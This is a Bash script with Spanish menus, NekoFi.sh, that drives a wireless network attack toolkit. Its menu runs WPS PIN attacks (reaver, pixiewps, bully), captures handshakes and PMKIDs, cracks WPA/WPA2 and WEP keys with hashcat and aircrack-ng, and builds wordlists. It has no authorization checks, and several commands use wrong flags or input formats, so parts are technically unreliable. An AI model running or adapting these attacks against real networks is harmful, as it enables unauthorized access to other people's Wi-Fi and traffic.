#!/bin/bash

set -e

REPO_URL="https://github.com/rodrigo47363/NekoFi/raw/main/NekoFi.sh"
SCRIPT_NAME="NekoFi.sh"
LOCAL_PATH="/usr/local/bin/$SCRIPT_NAME"

# Lista de herramientas necesarias
tools=(
    iw aircrack-ng xterm tmux iproute2 pciutils usbutils rfkill wget ccze x11-xserver-utils systemd hashcat reaver hcxdumptool
    john pixiewps bully cowpatty crunch wash procps airgeddon
)

# Función para verificar e instalar herramientas necesarias
install_tools() {
    echo "Verificando e instalando herramientas necesarias..."
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            echo "Instalando $tool..."
            if ! sudo apt-get update > /dev/null; then
                echo "Fallo en la actualización de paquetes"
                exit 1
            fi
            if ! sudo apt-get install -y "$tool" > /dev/null; then
                echo "Fallo en la instalación de $tool"
                exit 1
            fi
        else
            echo "$tool ya está instalado."
        fi
    done
}

# Función para detectar interfaces de red
detect_interfaces() {
    interfaces=($(ip link show | grep -E '^[0-9]+: ' | awk -F': ' '{print $2}'))
    echo "Interfaces de red detectadas:"
    for i in "${!interfaces[@]}"; do
        echo "$i) ${interfaces[$i]}"
    done
    read -p "Seleccione una interfaz de red: " interface_index
    selected_interface=${interfaces[$interface_index]}
}

# Función para manejar procesos que interfieren
kill_interfering_processes() {
    echo "Deteniendo procesos que pueden interferir..."
    sudo airmon-ng check kill
}

# Función para iniciar y detener el modo monitor
manage_monitor_mode() {
    local action=$1
    local channel=$2
    if [[ $action == "start" ]]; then
        kill_interfering_processes
        sudo airmon-ng start $selected_interface $channel || { echo "Fallo al iniciar el modo monitor"; exit 1; }
    elif [[ $action == "stop" ]]; then
        sudo airmon-ng stop ${selected_interface}mon || { echo "Fallo al detener el modo monitor"; exit 1; }
        sudo ip link set ${selected_interface} up || { echo "Fallo al activar la interfaz en modo managed"; exit 1; }
    fi
}

# Función para mostrar el menú de opciones
mostrar_menu() {
    clear
    echo "#######################################################"
    echo "#                                                     #"
    echo "#             NekoFi.sh                               #"
    echo "#             Versión 1.3                             #"
    echo "#             https://github.com/rodrigo47363/NekoFi  #"
    echo "#######################################################"
    echo
    echo "Seleccione una opción:"
    echo "1. Escanear redes WiFi"
    echo "2. Capturar Handshake (WPS/PMKID)"
    echo "3. Ataque WPS con Reaver"
    echo "4. Ataque WPS con PixieWPS"
    echo "5. Ataque WPS con Bully"
    echo "6. Ataque WPA/WPA2"
    echo "7. Ataque WEP"
    echo "8. Crear diccionario con Crunch"
    echo "9. Crear diccionario personalizado con Cowpatty"
    echo "10. Crackear contraseñas con Hashcat"
    echo "11. Poner interfaz en modo monitor"
    echo "12. Poner interfaz en modo managed"
    echo "13. Salir"
    echo "14. Actualizar NekoFi.sh desde GitHub"
    echo "15. Convertir .cap a .hccapx"
    echo "0. Ayuda"
}

# Función para mostrar ayuda
mostrar_ayuda() {
    echo "Ayuda - NekoFi.sh"
    echo "1. Escanear redes WiFi: Utiliza wash para escanear redes WiFi disponibles."
    echo "2. Capturar Handshake (WPS/PMKID): Usa hcxdumptool para capturar handshakes WPS/PMKID."
    echo "3. Ataque WPS con Reaver: Ataca redes con WPS usando Reaver."
    echo "4. Ataque WPS con PixieWPS: Ataca redes con WPS usando PixieWPS."
    echo "5. Ataque WPS con Bully: Ataca redes con WPS usando Bully."
    echo "6. Ataque WPA/WPA2: Realiza un ataque WPA/WPA2 usando un diccionario."
    echo "7. Ataque WEP: Realiza un ataque WEP."
    echo "8. Crear diccionario con Crunch: Crea un diccionario de contraseñas con Crunch."
    echo "9. Crear diccionario personalizado con Cowpatty: Crea un diccionario personalizado con Cowpatty."
    echo "10. Crackear contraseñas con Hashcat: Utiliza hashcat para crackear contraseñas usando un diccionario."
    echo "11. Poner interfaz en modo monitor: Cambia la interfaz seleccionada al modo monitor."
    echo "12. Poner interfaz en modo managed: Cambia la interfaz seleccionada al modo managed."
    echo "13. Salir: Cierra el script."
    echo "14. Actualizar NekoFi.sh desde GitHub: Descarga la última versión del script desde GitHub."
    echo "15. Convertir .cap a .hccapx: Convierte un archivo .cap a .hccapx."
}

# Función para poner la interfaz en modo monitor
poner_modo_monitor() {
    read -p "Ingrese el canal (dejar en blanco para omitir): " canal
    if [ -z "$canal" ]; then
        manage_monitor_mode "start"
    else
        manage_monitor_mode "start" "$canal"
    fi
}

# Función para poner la interfaz en modo managed
poner_modo_managed() {
    manage_monitor_mode "stop"
}

# Función para escanear redes WiFi usando wash
escaneo_redes() {
    echo "Escaneando redes WiFi..."
    poner_modo_monitor
    if ! sudo wash -i ${selected_interface}mon; then
        echo "Fallo al ejecutar wash"
        poner_modo_managed
        exit 1
    fi
    echo "Redes WiFi encontradas:"
    sudo wash -i ${selected_interface}mon
    poner_modo_managed
}

# Función para capturar handshakes (WPS/PMKID)
capturar_handshake() {
    echo "Capturando Handshake (WPS/PMKID)..."
    poner_modo_monitor
    capture_file=$(mktemp)
    if ! sudo hcxdumptool -i ${selected_interface}mon -o "$capture_file" --enable_status=1; then
        echo "Fallo al ejecutar hcxdumptool"
        poner_modo_managed
        exit 1
    fi
    if ! sudo hcxpcaptool -z pmkid_output.16800 "$capture_file"; then
        echo "Fallo al ejecutar hcxpcaptool"
        poner_modo_managed
        exit 1
    fi
    if [ -s pmkid_output.16800 ]; then
        echo "PMKID capturados:"
        cat pmkid_output.16800
    else
        echo "No se capturaron PMKIDs."
    fi
    rm "$capture_file"
    poner_modo_managed
}

# Función para ataque WPS con Reaver
ataque_wps_reaver() {
    escaneo_redes
    echo "Redes disponibles:"
    read -p "Ingrese el BSSID de la red: " bssid
    read -p "Ingrese el canal de la red: " canal
    echo "Iniciando ataque WPS con Reaver..."
    poner_modo_monitor $canal
    if ! sudo reaver -i ${selected_interface}mon -b $bssid -vv; then
        echo "Fallo al ejecutar Reaver"
        poner_modo_managed
        exit 1
    fi
    poner_modo_managed
}

# Función para ataque WPS con PixieWPS
ataque_wps_pixiewps() {
    escaneo_redes
    echo "Redes disponibles:"
    read -p "Ingrese el BSSID de la red: " bssid
    echo "Iniciando ataque WPS con PixieWPS..."
    poner_modo_monitor
    if ! sudo pixiewps -i ${selected_interface}mon -b $bssid; then
        echo "Fallo al ejecutar PixieWPS"
        poner_modo_managed
        exit 1
    fi
    poner_modo_managed
}

# Función para ataque WPS con Bully
ataque_wps_bully() {
    escaneo_redes
    echo "Redes disponibles:"
    read -p "Ingrese el BSSID de la red: " bssid
    echo "Iniciando ataque WPS con Bully..."
    poner_modo_monitor
    if ! sudo bully -i ${selected_interface}mon -b $bssid; then
        echo "Fallo al ejecutar Bully"
        poner_modo_managed
        exit 1
    fi
    poner_modo_managed
}

# Función para ataque WPA/WPA2
ataque_wpa() {
    escaneo_redes
    echo "Redes disponibles:"
    read -p "Ingrese el BSSID de la red: " bssid
    read -p "Ingrese el canal de la red: " canal
    echo "Iniciando ataque WPA/WPA2..."
    poner_modo_monitor $canal
    capture_file=$(mktemp)
    if ! sudo airodump-ng -c $canal --bssid $bssid -w "$capture_file" ${selected_interface}mon; then
        echo "Fallo al ejecutar airodump-ng"
        poner_modo_managed
        exit 1
    fi
    echo "Ingrese la ruta al diccionario para crackear la contraseña:"
    read diccionario
    if ! sudo hashcat -m 22000 -a 0 "$capture_file" "$diccionario"; then
        echo "Fallo al ejecutar hashcat"
        poner_modo_managed
        exit 1
    fi
    poner_modo_managed
}

# Función para ataque WEP
ataque_wep() {
    escaneo_redes
    echo "Redes disponibles:"
    read -p "Ingrese el BSSID de la red: " bssid
    read -p "Ingrese el canal de la red: " canal
    echo "Iniciando ataque WEP..."
    poner_modo_monitor $canal
    capture_file=$(mktemp)
    if ! sudo airodump-ng -c $canal --bssid $bssid -w "$capture_file" ${selected_interface}mon; then
        echo "Fallo al ejecutar airodump-ng"
        poner_modo_managed
        exit 1
    fi
    echo "Ingrese la ruta al diccionario para crackear la contraseña:"
    read diccionario
    if ! sudo aircrack-ng -w "$diccionario" -b $bssid "$capture_file"; then
        echo "Fallo al ejecutar aircrack-ng"
        poner_modo_managed
        exit 1
    fi
    poner_modo_managed
}

# Función para crear un diccionario con Crunch
crear_diccionario_crunch() {
    echo "Ingrese el formato del diccionario (por ejemplo, password@123):"
    read formato
    echo "Ingrese el rango de longitud del diccionario (por ejemplo, 8-12):"
    read rango
    echo "Ingrese la ruta y el nombre del archivo de salida:"
    read archivo_salida
    echo "Creando diccionario con Crunch..."
    if ! crunch $rango -o "$archivo_salida" $formato; then
        echo "Fallo al crear el diccionario con Crunch"
        exit 1
    fi
    echo "Diccionario creado en: $archivo_salida"
}

# Función para crear un diccionario personalizado con Cowpatty
crear_diccionario_cowpatty() {
    echo "Ingrese el archivo .cap con el handshake:"
    read archivo_cap
    echo "Ingrese la ruta y el nombre del archivo de salida:"
    read archivo_salida
    echo "Creando diccionario personalizado con Cowpatty..."
    if ! cowpatty -d $archivo_cap -o "$archivo_salida"; then
        echo "Fallo al crear el diccionario con Cowpatty"
        exit 1
    fi
    echo "Diccionario creado en: $archivo_salida"
}

# Función para crackear contraseñas con Hashcat
crackear_contraseñas_hashcat() {
    echo "Ingrese el archivo .hccapx con el handshake:"
    read archivo_hccapx
    echo "Ingrese la ruta y el nombre del diccionario:"
    read diccionario
    echo "Iniciando crackeo con Hashcat..."
    if ! hashcat -m 22000 -a 0 "$archivo_hccapx" "$diccionario"; then
        echo "Fallo al ejecutar Hashcat"
        exit 1
    fi
}

# Función para actualizar el script desde GitHub
actualizar_script() {
    echo "Actualizando NekoFi.sh desde GitHub..."
    sudo wget -O "$LOCAL_PATH" "$REPO_URL" || { echo "Fallo al descargar la última versión"; exit 1; }
    echo "Actualización completada. Reinicie el script para aplicar los cambios."
}

# Función para convertir .cap a .hccapx
convertir_cap_a_hccapx() {
    echo "Ingrese el archivo .cap:"
    read archivo_cap
    echo "Ingrese el archivo .hccapx de salida:"
    read archivo_hccapx
    echo "Convirtiendo archivo .cap a .hccapx..."
    if ! sudo hcxpcapngtool -o "$archivo_hccapx" "$archivo_cap"; then
        echo "Fallo al convertir el archivo"
        exit 1
    fi
    echo "Archivo convertido en: $archivo_hccapx"
}

# Menú principal
while true; do
    mostrar_menu
    read -p "Seleccione una opción: " opcion
    case $opcion in
        1) escaneo_redes ;;
        2) capturar_handshake ;;
        3) ataque_wps_reaver ;;
        4) ataque_wps_pixiewps ;;
        5) ataque_wps_bully ;;
        6) ataque_wpa ;;
        7) ataque_wep ;;
        8) crear_diccionario_crunch ;;
        9) crear_diccionario_cowpatty ;;
        10) crackear_contraseñas_hashcat ;;
        11) poner_modo_monitor ;;
        12) poner_modo_managed ;;
        13) exit 0 ;;
        14) actualizar_script ;;
        15) convertir_cap_a_hccapx ;;
        0) mostrar_ayuda ;;
        *) echo "Opción inválida. Inténtelo de nuevo." ;;
    esac
done
